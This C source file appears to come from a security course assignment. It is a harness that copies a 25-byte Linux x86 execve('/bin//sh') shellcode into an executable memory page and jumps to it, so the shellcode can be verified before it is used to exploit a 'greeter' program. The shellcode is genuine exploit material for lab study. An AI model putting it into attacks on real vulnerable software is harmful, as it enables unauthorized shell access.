/* Assignment 8, Step 2: "Find a way to test the shellcode before trying to
 * exploit the greeter program. Create a simple test program to try this."
 *
 * Loads the shell-spawning shellcode (the same bytes used in myRes.txt) into
 * a writable+executable page and jumps to it directly, with no buffer
 * overflow involved. This only proves the shellcode itself is correct; it
 * does not touch Greeter.
 */
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

/* 25-byte Linux x86 execve("/bin//sh", argv, NULL) shellcode (the classic
 * "shell-storm #1" sequence): builds "/bin//sh\0" on the stack, then calls
 * execve(ebx="/bin//sh", ecx=[ebx,NULL], edx=[NULL]) via int 0x80.
 *   xor eax,eax; push eax; push "//sh"; push "/bin"; mov ebx,esp;
 *   push eax; mov edx,esp; push ebx; mov ecx,esp; mov al,0x0b; int 0x80
 */
static const unsigned char shellcode[] = {
	0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69,
	0x6e, 0x89, 0xe3, 0x50, 0x89, 0xe2, 0x53, 0x89, 0xe1, 0xb0, 0x0b, 0xcd,
	0x80
};

int main(void)
{
	void *page;
	void (*shell)(void);

	page = mmap(NULL, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC,
	            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (page == MAP_FAILED) {
		perror("mmap");
		return 1;
	}
	memcpy(page, shellcode, sizeof(shellcode));
	fprintf(stderr, "shellcode_test: jumping into %zu bytes of shellcode at %p\n",
	        sizeof(shellcode), page);

	shell = (void (*)(void))page;
	shell(); /* execve() replaces this process on success; does not return */

	/* Only reached if execve() failed. */
	fprintf(stderr, "shellcode_test: shellcode returned, execve failed\n");
	return 1;
}
